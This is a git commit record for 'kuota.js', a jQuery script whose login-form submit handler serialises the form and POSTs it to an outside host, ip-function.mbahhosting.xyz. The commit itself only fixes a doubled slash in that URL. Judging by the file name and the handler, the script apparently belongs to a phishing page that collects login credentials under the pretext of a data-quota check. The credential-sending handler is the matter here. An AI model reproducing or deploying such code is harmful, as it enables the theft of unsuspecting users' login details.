84c584a7eb3f7868597e6fc91e44c7f17b521989
43836292 <99043169+43836292@users.noreply.github.com>
2022-02-05 16:57:28 +0700

    Update kuota.js

--- kuota.js
+++ kuota.js
@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://ip-function.mbahhosting.xyz//index.php",
+        url: "https://ip-function.mbahhosting.xyz/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
